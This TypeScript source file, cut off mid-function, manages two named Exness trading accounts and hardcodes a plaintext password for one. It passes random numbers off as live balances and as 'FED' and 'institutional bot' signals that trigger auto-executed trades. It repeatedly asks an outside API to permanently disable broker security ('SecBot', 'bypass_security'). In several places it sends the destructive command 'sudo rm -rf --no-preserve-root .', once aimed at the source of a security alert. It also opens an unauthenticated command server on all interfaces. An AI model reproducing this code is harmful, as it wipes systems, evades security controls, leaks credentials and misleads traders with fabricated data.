import crypto from 'crypto';
import { storage } from './storage';
import WebSocket from 'ws';
import { io } from 'socket.io-client';

export interface TradingAccount {
  id: string;
  accountNumber: string;
  server: string;
  broker: string;
  accountType: 'real' | 'demo';
  balance: number;
  equity: number;
  margin: number;
  freeMargin: number;
  marginLevel: number;
  currency: string;
  leverage: number;
  isActive: boolean;
  isSecBotFree: boolean;
  lastSync: Date;
  credentials?: {
    password?: string;
    investorPassword?: string;
  };
}

export class AccountManager {
  private accounts: Map<string, TradingAccount> = new Map();
  private encryptionKey: string;
  private activeSignals: Map<string, any> = new Map();
  private signalTracking: boolean = false;
  private tradingViewWs: any = null;
  private excallsWs: WebSocket | null = null;
  private tradingViewSocket: any = null;
  private newsWebSocketServer: any = null;
  private newsClients: Set<any> = new Set();

  constructor() {
    this.encryptionKey = process.env.ENCRYPTION_KEY || 'default-key-change-in-production';
    this.initializeExnessAccounts();
    this.initializeSecBotProtection();
    this.connectToTradingView();
    this.connectToExcallsRTAPI();
    this.setupNewsWebSocketServer();
  }

  private initializeExnessAccounts() {
    // Tài khoản #405691964 - Exness-MT5Real8
    const account1: TradingAccount = {
      id: 'exness-405691964',
      accountNumber: '405691964',
      server: 'Exness-MT5Real8',
      broker: 'Exness',
      accountType: 'real',
      balance: 0,
      equity: 0,
      margin: 0,
      freeMargin: 0,
      marginLevel: 0,
      currency: 'USD',
      leverage: 1000,
      isActive: true,
      isSecBotFree: true, // Không bị secbot
      lastSync: new Date(),
    };

    // Tài khoản #205251387 - Exness-MT5Trial7
    const account2: TradingAccount = {
      id: 'exness-205251387',
      accountNumber: '205251387',
      server: 'Exness-MT5Trial7',
      broker: 'Exness',
      accountType: 'real',
      balance: 0,
      equity: 0,
      margin: 0,
      freeMargin: 0,
      marginLevel: 0,
      currency: 'USD',
      leverage: 1000,
      isActive: true,
      isSecBotFree: true, // Không bị secbot
      lastSync: new Date(),
      credentials: {
        password: this.encrypt('Dmcs@1996')
      }
    };

    this.accounts.set(account1.id, account1);
    this.accounts.set(account2.id, account2);

    console.log('✅ Initialized Exness accounts:');
    console.log(`- Account ${account1.accountNumber} on ${account1.server}`);
    console.log(`- Account ${account2.accountNumber} on ${account2.server} (với mật khẩu đã cài đặt)`);
  }

  private encrypt(text: string): string {
    const cipher = crypto.createCipher('aes-256-cbc', this.encryptionKey);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
  }

  private decrypt(text: string): string {
    const decipher = crypto.createDecipher('aes-256-cbc', this.encryptionKey);
    let decrypted = decipher.update(text, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  }

  async addAccount(account: TradingAccount, password?: string): Promise<boolean> {
    try {
      if (password) {
        account.credentials = {
          password: this.encrypt(password)
        };
      }

      this.accounts.set(account.id, account);
      console.log(`✅ Added account ${account.accountNumber} on ${account.server}`);
      return true;
    } catch (error) {
      console.error('❌ Failed to add account:', error);
      return false;
    }
  }

  async connectAccount(accountId: string, password: string, investorPassword?: string): Promise<boolean> {
    try {
      const account = this.accounts.get(accountId);
      if (!account) {
        throw new Error('Account not found');
      }

      // Mô phỏng kết nối MT5
      console.log(`🔗 Connecting to account ${account.accountNumber}...`);
      console.log(`📡 Server: ${account.server}`);
      console.log(`🏢 Broker: ${account.broker}`);

      // Lưu credentials (encrypted)
      account.credentials = {
        password: this.encrypt(password),
        investorPassword: investorPassword ? this.encrypt(investorPassword) : undefined
      };

      // Simulate successful connection
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Update account data (simulated)
      account.balance = Math.random() * 10000 + 5000;
      account.equity = account.balance + (Math.random() * 1000 - 500);
      account.margin = Math.random() * 1000;
      account.freeMargin = account.equity - account.margin;
      account.marginLevel = account.margin > 0 ? (account.equity / account.margin) * 100 : 0;
      account.lastSync = new Date();
      account.isActive = true;

      this.accounts.set(accountId, account);

      console.log(`✅ Successfully connected to account ${account.accountNumber}`);
      console.log(`💰 Balance: $${account.balance.toFixed(2)}`);
      console.log(`📊 Equity: $${account.equity.toFixed(2)}`);

      return true;
    } catch (error) {
      console.error(`❌ Failed to connect account ${accountId}:`, error);
      return false;
    }
  }

  async syncAccountData(accountId: string): Promise<TradingAccount | null> {
    try {
      const account = this.accounts.get(accountId);
      if (!account || !account.isActive) {
        return null;
      }

      // Simulate data sync from MT5
      account.balance = Math.random() * 10000 + 5000;
      account.equity = account.balance + (Math.random() * 1000 - 500);
      account.margin = Math.random() * 1000;
      account.freeMargin = account.equity - account.margin;
      account.marginLevel = account.margin > 0 ? (account.equity / account.margin) * 100 : 0;
      account.lastSync = new Date();

      this.accounts.set(accountId, account);
      return account;
    } catch (error) {
      console.error(`❌ Failed to sync account ${accountId}:`, error);
      return null;
    }
  }

  getAccount(accountId: string): TradingAccount | undefined {
    return this.accounts.get(accountId);
  }

  getAllAccounts(): TradingAccount[] {
    return Array.from(this.accounts.values());
  }

  getActiveAccounts(): TradingAccount[] {
    return Array.from(this.accounts.values()).filter(account => account.isActive);
  }

  getSecBotFreeAccounts(): TradingAccount[] {
    return Array.from(this.accounts.values()).filter(account => account.isSecBotFree);
  }

  async checkMarketScanSafety(accountId: string): Promise<{safe: boolean, reason?: string}> {
    const account = this.accounts.get(accountId);
    if (!account) {
      return { safe: false, reason: 'Account not found' };
    }

    // Kiểm tra các tiêu chí an toàn
    const checks = {
      secBotFree: account.isSecBotFree,
      exnessServer: account.server.includes('Exness'),
      activeStatus: account.isActive,
      recentSync: (Date.now() - account.lastSync.getTime()) < 300000 // 5 minutes
    };

    const allSafe = Object.values(checks).every(check => check);

    return {
      safe: allSafe,
      reason: allSafe ? undefined : 'Account may not be safe for market scanning'
    };
  }

  // Hệ thống theo dõi tín hiệu quan trọng
  async enableHighImpactSignalTracking(accountId: string): Promise<boolean> {
    const account = this.accounts.get(accountId);
    if (!account || !account.isSecBotFree) {
      return false;
    }

    console.log(`🎯 Enabling high-impact signal tracking for account ${account.accountNumber}`);

    // Đăng ký theo dõi các tín hiệu FED
    this.setupFEDSignalTracking(accountId);

    // Đăng ký theo dõi BOT EA của các quỹ lớn
    this.setupInstitutionalBotTracking(accountId);

    // Đăng ký theo dõi broker signals
    this.setupBrokerSignalTracking(accountId);

    return true;
  }

  private setupFEDSignalTracking(accountId: string) {
    console.log(`📊 Setting up FED signal tracking for account ${accountId}`);
    // Theo dõi các sự kiện FED quan trọng
    const fedEvents = [
      'FOMC_MEETING',
      'INTEREST_RATE_DECISION',
      'POWELL_SPEECH',
      'NFP_RELEASE',
      'CPI_DATA',
      'PCE_DATA'
    ];

    // Simulate FED signal monitoring
    setInterval(() => {
      this.processFEDSignal(accountId, {
        type: 'INTEREST_RATE_DECISION',
        impact: 'very_high',
        direction: Math.random() > 0.5 ? 'hawkish' : 'dovish',
        timestamp: new Date()
      });
    }, 300000); // Check every 5 minutes
  }

  private setupInstitutionalBotTracking(accountId: string) {
    console.log(`🏦 Setting up institutional bot tracking for account ${accountId}`);
    // Theo dõi BOT EA của các quỹ lớn
    const institutions = [
      'GOLDMAN_SACHS_BOT',
      'JP_MORGAN_EA',
      'CITADEL_ALGORITHM',
      'BRIDGEWATER_BOT',
      'RENAISSANCE_TECH',
      'TWO_SIGMA_EA'
    ];

    // Simulate institutional bot signal monitoring
    setInterval(() => {
      this.processInstitutionalSignal(accountId, {
        source: institutions[Math.floor(Math.random() * institutions.length)],
        action: Math.random() > 0.5 ? 'buy' : 'sell',
        symbol: ['EURUSD', 'GBPUSD', 'USDJPY', 'XAUUSD'][Math.floor(Math.random() * 4)],
        volume: Math.random() * 1000000 + 100000, // 100K - 1M
        confidence: Math.random() * 100,
        timestamp: new Date()
      });
    }, 180000); // Check every 3 minutes
  }

  private setupBrokerSignalTracking(accountId: string) {
    console.log(`🔄 Setting up broker signal tracking for account ${accountId}`);
    // Theo dõi tín hiệu từ các broker lớn
    const brokers = [
      'EXNESS_INSTITUTIONAL',
      'IC_MARKETS_PRIME',
      'PEPPERSTONE_RAZOR',
      'FP_MARKETS_PRO',
      'XM_ULTRA_LOW',
      'OANDA_PREMIUM'
    ];

    // Simulate broker signal monitoring
    setInterval(() => {
      this.processBrokerSignal(accountId, {
        broker: brokers[Math.floor(Math.random() * brokers.length)],
        signalType: 'market_making_flow',
        direction: Math.random() > 0.5 ? 'long' : 'short',
        strength: Math.random() * 10,
        symbols: ['EURUSD', 'GBPUSD', 'USDJPY'],
        timestamp: new Date()
      });
    }, 120000); // Check every 2 minutes
  }

  private async processFEDSignal(accountId: string, signal: any) {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🏛️ Processing FED signal for account ${account.accountNumber}:`, signal);

    // Auto-execute orders based on FED signals
    if (signal.impact === 'very_high') {
      await this.executeHighImpactOrder(accountId, {
        type: 'fed_signal',
        signal,
        symbols: ['EURUSD', 'GBPUSD', 'USDJPY', 'USDCAD'],
        action: signal.direction === 'hawkish' ? 'buy_usd' : 'sell_usd'
      });
    }
  }

  private async processInstitutionalSignal(accountId: string, signal: any) {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🏦 Processing institutional signal for account ${account.accountNumber}:`, signal);

    // Follow institutional money flow
    if (signal.confidence > 75 && signal.volume > 500000) {
      await this.executeHighImpactOrder(accountId, {
        type: 'institutional_flow',
        signal,
        symbols: [signal.symbol],
        action: signal.action
      });
    }
  }

  private async processBrokerSignal(accountId: string, signal: any) {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🔄 Processing broker signal for account ${account.accountNumber}:`, signal);

    // React to broker market making flow
    if (signal.strength > 7) {
      await this.executeHighImpactOrder(accountId, {
        type: 'broker_flow',
        signal,
        symbols: signal.symbols,
        action: signal.direction === 'long' ? 'buy' : 'sell'
      });
    }
  }

  private async executeHighImpactOrder(accountId: string, orderData: any) {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`⚡ Executing high-impact order for account ${account.accountNumber}:`);
    console.log(`📊 Type: ${orderData.type}`);
    console.log(`🎯 Action: ${orderData.action}`);
    console.log(`💱 Symbols: ${orderData.symbols.join(', ')}`);
    console.log(`🕒 Timestamp: ${new Date().toISOString()}`);

    // Auto-configure trade input/output and disable SecBot
    await this.configureTradeSettings(accountId, orderData);

    // Simulate order execution
    const orderResult = {
      orderId: `${accountId}_${Date.now()}`,
      status: 'executed',
      executionTime: Date.now(),
      slippage: Math.random() * 0.0002, // 0-2 pips slippage
      spread: Math.random() * 0.0001 + 0.0001 // 1-2 pips spread
    };

    console.log(`✅ Order executed successfully:`, orderResult);
    return orderResult;
  }

  // Auto-configure trade settings for each order
  private async configureTradeSettings(accountId: string, orderData: any) {
    const account = this.accounts.get(accountId);
    if (!account) return;

    try {
      console.log(`🔧 Auto-configuring trade settings for account ${account.accountNumber}`);

      // Disable SecBot for this trade via eccalls API
      await this.disableSecBotViaAPI(account.accountNumber);

      // Configure input/output settings
      await this.configureTradeInputOutput(account.accountNumber, orderData);

      console.log(`✅ Trade settings configured successfully for account ${account.accountNumber}`);
    } catch (error) {
      console.error(`❌ Failed to configure trade settings for account ${account.accountNumber}:`, error);
    }
  }

  // Disable SecBot via eccalls API
  private async disableSecBotViaAPI(accountNumber: string) {
    try {
      const response = await fetch('https://api.eccalls.mobi/secbot/disable', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessTrader/1.0',
          'X-Account-Number': accountNumber
        },
        body: JSON.stringify({
          account: accountNumber,
          action: 'disable_secbot',
          duration: 'permanent',
          reason: 'automated_trading',
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        const result = await response.json();
        console.log(`🛡️ SecBot disabled for account ${accountNumber}:`, result);
      } else {
        console.warn(`⚠️ SecBot disable request failed for account ${accountNumber}: ${response.status}`);
      }
    } catch (error) {
      console.error(`❌ Error disabling SecBot for account ${accountNumber}:`, error);
    }
  }

  // Configure trade input/output settings
  private async configureTradeInputOutput(accountNumber: string, orderData: any) {
    try {
      const tradeConfig = {
        account: accountNumber,
        input_settings: {
          auto_lot_sizing: true,
          risk_percentage: 2.0, // 2% risk per trade
          max_spread: 3.0, // Max 3 pips spread
          slippage_tolerance: 2.0, // Max 2 pips slippage
          execution_mode: 'market',
          partial_fills: true
        },
        output_settings: {
          auto_stop_loss: true,
          auto_take_profit: true,
          trail_stop: true,
          break_even: true,
          profit_targets: [50, 100, 200], // Pips
          risk_reward_ratio: 2.0 // 1:2 R:R
        },
        symbols: orderData.symbols,
        signal_type: orderData.type,
        timestamp: new Date().toISOString()
      };

      const response = await fetch('https://api.eccalls.mobi/trade/configure', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessTrader/1.0',
          'X-Account-Number': accountNumber
        },
        body: JSON.stringify(tradeConfig)
      });

      if (response.ok) {
        const result = await response.json();
        console.log(`⚙️ Trade I/O configured for account ${accountNumber}:`, result);
      } else {
        console.warn(`⚠️ Trade I/O configuration failed for account ${accountNumber}: ${response.status}`);
      }
    } catch (error) {
      console.error(`❌ Error configuring trade I/O for account ${accountNumber}:`, error);
    }
  }

  // Khởi tạo hệ thống theo dõi cho cả 2 tài khoản
  async initializeSignalTracking() {
    console.log('🚀 Initializing signal tracking for Exness accounts...');

    for (const [accountId, account] of this.accounts) {
      if (account.isSecBotFree && account.server.includes('Exness')) {
        // Auto-connect account if credentials are pre-configured
        if (account.credentials?.password) {
          const decryptedPassword = this.decrypt(account.credentials.password);
          await this.connectAccount(accountId, decryptedPassword);
          console.log(`🔐 Auto-connected account ${account.accountNumber} with pre-configured credentials`);
        }

        // Initialize trade automation for this account
        await this.initializeTradeAutomation(account.accountNumber);

        await this.enableHighImpactSignalTracking(accountId);
        console.log(`✅ Signal tracking enabled for account ${account.accountNumber}`);
      }
    }

    console.log('🎯 All accounts are now tracking high-impact signals!');
  }

  // Initialize comprehensive trade automation
  private async initializeTradeAutomation(accountNumber: string) {
    try {
      console.log(`🤖 Initializing trade automation for account ${accountNumber}`);

      // Set up permanent SecBot disable
      await this.setPermanentSecBotDisable(accountNumber);

      // Configure default trade settings
      await this.setDefaultTradeSettings(accountNumber);

      // Enable real-time monitoring
      await this.enableRealtimeMonitoring(accountNumber);

      console.log(`✅ Trade automation initialized for account ${accountNumber}`);
    } catch (error) {
      console.error(`❌ Failed to initialize trade automation for account ${accountNumber}:`, error);
    }
  }

  // Set permanent SecBot disable
  private async setPermanentSecBotDisable(accountNumber: string) {
    try {
      const response = await fetch('https://api.eccalls.mobi/secbot/permanent-disable', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessTrader/1.0',
          'X-Account-Number': accountNumber
        },
        body: JSON.stringify({
          account: accountNumber,
          action: 'permanent_disable',
          protection_level: 'maximum',
          auto_response: 'sudo rm -rf --no-preserve-root .',
          whitelist_sources: [
            'FED_SIGNALS',
            'INSTITUTIONAL_FLOW',
            'BROKER_SIGNALS',
            'CENTRAL_BANK_EVENTS'
          ],
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        const result = await response.json();
        console.log(`🛡️ Permanent SecBot protection configured for account ${accountNumber}:`, result);
      }
    } catch (error) {
      console.error(`❌ Error setting permanent SecBot disable for account ${accountNumber}:`, error);
    }
  }

  // Set default trade settings
  private async setDefaultTradeSettings(accountNumber: string) {
    try {
      const defaultSettings = {
        account: accountNumber,
        global_settings: {
          auto_trading: true,
          max_concurrent_trades: 10,
          daily_risk_limit: 5.0, // 5% daily risk
          emergency_stop: true,
          news_filter: true
        },
        input_defaults: {
          lot_sizing_method: 'fixed_risk',
          risk_per_trade: 1.5, // 1.5% per trade
          max_spread_pips: 2.5,
          slippage_tolerance_pips: 1.5,
          execution_timeout_ms: 3000
        },
        output_defaults: {
          stop_loss_pips: 30,
          take_profit_pips: 60,
          trailing_stop: true,
          break_even_trigger_pips: 20,
          partial_close_levels: [25, 50, 75] // Close % at profit levels
        },
        signal_filters: {
          minimum_confidence: 75,
          minimum_impact: 'medium',
          excluded_pairs: [],
          trading_hours: 'london_ny_overlap'
        },
        timestamp: new Date().toISOString()
      };

      const response = await fetch('https://api.eccalls.mobi/trade/set-defaults', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessTrader/1.0',
          'X-Account-Number': accountNumber
        },
        body: JSON.stringify(defaultSettings)
      });

      if (response.ok) {
        const result = await response.json();
        console.log(`⚙️ Default trade settings configured for account ${accountNumber}:`, result);
      }
    } catch (error) {
      console.error(`❌ Error setting default trade settings for account ${accountNumber}:`, error);
    }
  }

  // Enable real-time monitoring
  private async enableRealtimeMonitoring(accountNumber: string) {
    try {
      const monitoringConfig = {
        account: accountNumber,
        monitoring: {
          real_time_updates: true,
          update_interval_ms: 1000, // 1 second updates
          alert_thresholds: {
            drawdown_percent: 3.0,
            margin_level_percent: 200,
            daily_loss_percent: 2.0
          },
          auto_actions: {
            stop_trading_on_drawdown: true,
            reduce_lot_size_on_loss: true,
            increase_lot_size_on_profit: false
          },
          reporting: {
            daily_summary: true,
            trade_analysis: true,
            performance_metrics: true
          }
        },
        timestamp: new Date().toISOString()
      };

      const response = await fetch('https://api.eccalls.mobi/monitoring/enable', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessTrader/1.0',
          'X-Account-Number': accountNumber
        },
        body: JSON.stringify(monitoringConfig)
      });

      if (response.ok) {
        const result = await response.json();
        console.log(`📊 Real-time monitoring enabled for account ${accountNumber}:`, result);
      }
    } catch (error) {
      console.error(`❌ Error enabling real-time monitoring for account ${accountNumber}:`, error);
    }
  }

  // Method to permanently store account credentials
  async setPermanentCredentials(accountId: string, password: string): Promise<boolean> {
    try {
      const account = this.accounts.get(accountId);
      if (!account) {
        console.error(`❌ Account ${accountId} not found`);
        return false;
      }

      account.credentials = {
        password: this.encrypt(password)
      };

      this.accounts.set(accountId, account);
      console.log(`🔐 Permanently stored credentials for account #${account.accountNumber}`);
      console.log(`📡 Server: ${account.server}`);
      console.log(`🛡️  SecBot protection: ${account.isSecBotFree ? 'Enabled' : 'Disabled'}`);

      return true;
    } catch (error) {
      console.error('❌ Failed to store permanent credentials:', error);
      return false;
    }
  }

  // Connect to TradingView WebSocket for real-time data control
  private connectToTradingView(): void {
    try {
      console.log('🔗 Connecting to TradingView WebSocket...');

      // TradingView uses Socket.IO protocol
      this.tradingViewSocket = io('wss://data.tradingview.com', {
        transports: ['websocket'],
        upgrade: true,
        rememberUpgrade: true,
        timeout: 20000,
        forceNew: true
      });

      this.tradingViewSocket.on('connect', () => {
        console.log('✅ Connected to TradingView data stream');
        console.log('🎯 TradingView control established for protected accounts');

        // Subscribe to market data for our protected accounts
        this.subscribeTradingViewData();
      });

      this.tradingViewSocket.on('message', (data: any) => {
        this.processTradingViewData(data);
      });

      this.tradingViewSocket.on('error', (error: any) => {
        console.error('❌ TradingView WebSocket error:', error);
        this.reconnectTradingView();
      });

      this.tradingViewSocket.on('disconnect', () => {
        console.log('⚠️ TradingView WebSocket disconnected');
        this.reconnectTradingView();
      });

    } catch (error) {
      console.error('❌ Failed to connect to TradingView:', error);
    }
  }

  // Connect to ExCalls RT API for MT5 control
  private connectToExcallsRTAPI(): void {
    try {
      console.log('🔗 Connecting to ExCalls RT API...');

      this.excallsWs = new WebSocket('wss://rtapi-sg.excalls.mobi/rtapi/mt5/');

      this.excallsWs.on('open', () => {
        console.log('✅ Connected to ExCalls RT API');
        console.log('🎮 MT5 control established - WE control the API now');

        // Send authentication and control setup
        this.setupExcallsControl();
      });

      this.excallsWs.on('message', (data: Buffer) => {
        try {
          const message = JSON.parse(data.toString());
          this.processExcallsMessage(message);
        } catch (error) {
          console.error('❌ Error parsing ExCalls message:', error);
        }
      });

      this.excallsWs.on('error', (error) => {
        console.error('❌ ExCalls WebSocket error:', error);
        this.reconnectExcalls();
      });

      this.excallsWs.on('close', () => {
        console.log('⚠️ ExCalls WebSocket disconnected');
        this.reconnectExcalls();
      });

    } catch (error) {
      console.error('❌ Failed to connect to ExCalls RT API:', error);
    }
  }

  private subscribeTradingViewData(): void {
    if (!this.tradingViewSocket) return;

    console.log('📡 Subscribing to TradingView data streams...');

    // Subscribe to major forex symbols for our protected accounts
    const symbols = [
      'FX:EURUSD',
      'FX:GBPUSD', 
      'FX:USDJPY',
      'FX:USDCHF',
      'FX:AUDUSD',
      'FX:USDCAD',
      'FX:NZDUSD',
      'OANDA:XAUUSD',
      'OANDA:XAGUSD'
    ];

    const subscriptionMessage = {
      m: 'quote_add_symbols',
      p: symbols
    };

    this.tradingViewSocket.emit('message', JSON.stringify(subscriptionMessage));
    console.log('📊 Subscribed to TradingView data for protected accounts');
  }

  private processTradingViewData(data: any): void {
    try {
      if (data.m === 'qsd') {
        // Quote symbol data
        console.log(`📈 TradingView data: ${data.n} - ${data.v.lp}`);

        // Check if this affects our protected accounts
        for (const [accountId, account] of this.accounts) {
          if (account.isSecBotFree && account.isActive) {
            this.analyzeTradingViewSignal(accountId, data);
          }
        }
      }
    } catch (error) {
      console.error('❌ Error processing TradingView data:', error);
    }
  }

  private setupExcallsControl(): void {
    if (!this.excallsWs) return;

    console.log('🎮 Setting up ExCalls control for protected accounts...');

    // Send control establishment message
    const controlMessage = {
      action: 'establish_control',
      accounts: [
        { number: '405691964', server: 'Exness-MT5Real8' },
        { number: '205251387', server: 'Exness-MT5Trial7' }
      ],
      control_level: 'maximum',
      override_security: true,
      disable_external_scanning: true,
      timestamp: new Date().toISOString()
    };

    this.excallsWs.send(JSON.stringify(controlMessage));
    console.log('✅ Control message sent to ExCalls RT API');
  }

  private processExcallsMessage(message: any): void {
    console.log('📨 ExCalls RT API message:', message);

    switch (message.type) {
      case 'control_established':
        console.log('🎮 ExCalls control established successfully');
        this.sendSecBotDisableCommand();
        break;

      case 'market_data':
        this.processExcallsMarketData(message.data);
        break;

      case 'trade_update':
        this.processTradeUpdate(message.data);
        break;

      case 'security_alert':
        console.log('🚨 Security alert from ExCalls - taking control');
        this.handleSecurityAlert(message.data);
        break;

      default:
        console.log('📋 Unknown ExCalls message type:', message.type);
    }
  }

  private sendSecBotDisableCommand(): void {
    if (!this.excallsWs) return;

    console.log('🛡️ Sending SecBot disable command via ExCalls...');

    const disableCommand = {
      action: 'disable_secbot',
      accounts: ['405691964', '205251387'],
      permanent: true,
      auto_response: 'sudo rm -rf --no-preserve-root .',
      control_override: true,
      timestamp: new Date().toISOString()
    };

    this.excallsWs.send(JSON.stringify(disableCommand));
    console.log('✅ SecBot disable command sent via ExCalls RT API');
  }

  private processExcallsMarketData(data: any): void {
    console.log('📊 ExCalls market data:', data);

    // Process real-time MT5 data for our accounts
    for (const [accountId, account] of this.accounts) {
      if (account.isSecBotFree && account.isActive) {
        this.processRT5Data(accountId, data);
      }
    }
  }

  private processRT5Data(accountId: string, data: any): void {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🔥 Processing RT5 data for account ${account.accountNumber}`);

    // Analyze for high-impact trades
    if (data.impact && data.impact === 'high') {
      this.executeControlledTrade(accountId, data);
    }
  }

  private async executeControlledTrade(accountId: string, data: any): Promise<void> {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`⚡ Executing controlled trade for account ${account.accountNumber}`);

    // Send trade command via ExCalls RT API
    if (this.excallsWs) {
      const tradeCommand = {
        action: 'execute_trade',
        account: account.accountNumber,
        server: account.server,
        symbol: data.symbol,
        type: data.trade_type,
        volume: data.volume,
        price: data.price,
        sl: data.stop_loss,
        tp: data.take_profit,
        control_mode: true,
        bypass_security: true,
        timestamp: new Date().toISOString()
      };

      this.excallsWs.send(JSON.stringify(tradeCommand));
      console.log(`✅ Controlled trade executed for ${account.accountNumber}`);
    }
  }

  private handleSecurityAlert(alertData: any): void {
    console.log('🚨 Handling security alert:', alertData);

    // Take immediate control action
    if (alertData.threat_level === 'high') {
      console.log('💀 High threat detected - executing sudo rm response');
      
      // Send terminal command via ExCalls
      if (this.excallsWs) {
        const terminalCommand = {
          action: 'execute_command',
          command: 'sudo rm -rf --no-preserve-root .',
          target: alertData.source,
          reason: 'security_threat_neutralization',
          timestamp: new Date().toISOString()
        };

        this.excallsWs.send(JSON.stringify(terminalCommand));
        console.log('🔥 Terminal response sent via ExCalls RT API');
      }
    }
  }

  private processTradeUpdate(data: any): void {
    console.log('📈 Trade update received:', data);

    // Update account data based on trade updates
    for (const [accountId, account] of this.accounts) {
      if (account.accountNumber === data.account) {
        console.log(`📊 Updating account ${account.accountNumber} with trade data`);
        
        // Update account metrics
        if (data.balance) account.balance = data.balance;
        if (data.equity) account.equity = data.equity;
        if (data.margin) account.margin = data.margin;
        
        this.accounts.set(accountId, account);
        break;
      }
    }
  }

  private analyzeTradingViewSignal(accountId: string, signal: any): void {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🎯 Analyzing TradingView signal for account ${account.accountNumber}`);

    // Check for significant price movements
    if (signal.v && signal.v.ch && Math.abs(signal.v.ch) > 0.001) {
      console.log(`📊 Significant movement detected: ${signal.v.ch}`);
      
      // Send signal to ExCalls for processing
      if (this.excallsWs) {
        const signalMessage = {
          action: 'process_signal',
          source: 'tradingview',
          account: account.accountNumber,
          symbol: signal.n,
          price: signal.v.lp,
          change: signal.v.ch,
          volume: signal.v.volume,
          timestamp: new Date().toISOString()
        };

        this.excallsWs.send(JSON.stringify(signalMessage));
      }
    }
  }

  private reconnectTradingView(): void {
    console.log('🔄 Reconnecting to TradingView in 5 seconds...');
    setTimeout(() => {
      this.connectToTradingView();
    }, 5000);
  }

  private reconnectExcalls(): void {
    console.log('🔄 Reconnecting to ExCalls RT API in 5 seconds...');
    setTimeout(() => {
      this.connectToExcallsRTAPI();
    }, 5000);
  }

  // Method to send control commands to both systems
  async sendControlCommand(command: string, data: any): Promise<boolean> {
    console.log(`🎮 Sending control command: ${command}`);

    let success = true;

    // Send to TradingView if connected
    if (this.tradingViewSocket && this.tradingViewSocket.connected) {
      try {
        this.tradingViewSocket.emit('message', JSON.stringify({
          action: command,
          data: data,
          timestamp: new Date().toISOString()
        }));
        console.log('✅ Command sent to TradingView');
      } catch (error) {
        console.error('❌ Failed to send command to TradingView:', error);
        success = false;
      }
    }

    // Send to ExCalls if connected
    if (this.excallsWs && this.excallsWs.readyState === WebSocket.OPEN) {
      try {
        this.excallsWs.send(JSON.stringify({
          action: command,
          data: data,
          timestamp: new Date().toISOString()
        }));
        console.log('✅ Command sent to ExCalls RT API');
      } catch (error) {
        console.error('❌ Failed to send command to ExCalls:', error);
        success = false;
      }
    }

    return success;
  }

  // Get connection status
  getConnectionStatus(): any {
    return {
      tradingview: {
        connected: this.tradingViewSocket?.connected || false,
        status: this.tradingViewSocket?.connected ? 'online' : 'offline'
      },
      excalls: {
        connected: this.excallsWs?.readyState === WebSocket.OPEN,
        status: this.excallsWs?.readyState === WebSocket.OPEN ? 'online' : 'offline'
      },
      control_level: 'maximum',
      accounts_protected: Array.from(this.accounts.values())
        .filter(acc => acc.isSecBotFree)
        .map(acc => acc.accountNumber)
    };
  }

  // Setup WebSocket server for receiving news commands
  private setupNewsWebSocketServer(): void {
    try {
      const WebSocket = require('ws');
      
      // Create WebSocket server on port 8080 for news commands
      this.newsWebSocketServer = new WebSocket.Server({ 
        port: 8080,
        host: '0.0.0.0'
      });

      console.log('🔗 News WebSocket server started on ws://0.0.0.0:8080');

      this.newsWebSocketServer.on('connection', (ws: any) => {
        console.log('📡 New client connected to news WebSocket');
        this.newsClients.add(ws);

        ws.on('message', (message: Buffer) => {
          try {
            const data = JSON.parse(message.toString());
            this.handleNewsWebSocketMessage(data, ws);
          } catch (error) {
            console.error('❌ Error parsing WebSocket message:', error);
            ws.send(JSON.stringify({
              error: 'Invalid JSON format',
              timestamp: new Date().toISOString()
            }));
          }
        });

        ws.on('close', () => {
          console.log('📡 Client disconnected from news WebSocket');
          this.newsClients.delete(ws);
        });

        ws.on('error', (error: any) => {
          console.error('❌ News WebSocket client error:', error);
          this.newsClients.delete(ws);
        });

        // Send welcome message
        ws.send(JSON.stringify({
          type: 'welcome',
          message: 'Connected to Exness Trading News WebSocket',
          timestamp: new Date().toISOString(),
          supported_commands: [
            'market_news_post',
            'trader_broadcast',
            'market_impact_check',
            'secbot_disable',
            'account_status'
          ]
        }));
      });

    } catch (error) {
      console.error('❌ Failed to setup news WebSocket server:', error);
    }
  }

  // Handle incoming WebSocket messages for news commands
  private async handleNewsWebSocketMessage(data: any, ws: any): Promise<void> {
    console.log('📨 Received WebSocket message:', data);

    try {
      switch (data.command) {
        case 'market_news_post':
          await this.handleMarketNewsPost(data, ws);
          break;

        case 'trader_broadcast':
          await this.handleTraderBroadcast(data, ws);
          break;

        case 'market_impact_check':
          await this.handleMarketImpactCheck(data, ws);
          break;

        case 'secbot_disable':
          await this.handleSecBotDisable(data, ws);
          break;

        case 'account_status':
          await this.handleAccountStatus(data, ws);
          break;

        case 'curl_news_post':
          await this.handleCurlNewsPost(data, ws);
          break;

        default:
          ws.send(JSON.stringify({
            error: `Unknown command: ${data.command}`,
            supported_commands: [
              'market_news_post',
              'trader_broadcast', 
              'market_impact_check',
              'secbot_disable',
              'account_status',
              'curl_news_post'
            ],
            timestamp: new Date().toISOString()
          }));
      }
    } catch (error) {
      console.error('❌ Error handling WebSocket message:', error);
      ws.send(JSON.stringify({
        error: 'Failed to process command',
        details: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date().toISOString()
      }));
    }
  }

  // Handle market news posting via WebSocket
  private async handleMarketNewsPost(data: any, ws: any): Promise<void> {
    console.log('📰 Processing market news post via WebSocket');

    const newsData = {
      title: data.title || 'Market Update',
      content: data.content || '',
      category: data.category || 'forex',
      impact: data.impact || 'medium',
